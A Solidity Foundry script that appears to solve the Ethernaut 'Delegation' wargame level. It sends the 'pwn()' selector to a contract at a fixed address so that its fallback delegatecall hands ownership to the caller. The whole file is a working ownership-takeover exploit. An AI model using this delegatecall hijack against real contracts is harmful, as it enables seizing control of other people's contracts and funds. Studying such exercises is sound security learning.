// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationScript is Script {
    Delegation public delegation;
    Delegate public delegate;

    function run() public {
        delegation = Delegation(0x5B7172Fe8C88FbBffbF2d1dAe6123cC41d561eF6);
        delegate = Delegate(0x5B7172Fe8C88FbBffbF2d1dAe6123cC41d561eF6);
        attack();
    }

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        vm.startBroadcast();
        delegate.pwn();
        address(delegation).call(payload);
        vm.stopBroadcast();
    }
}
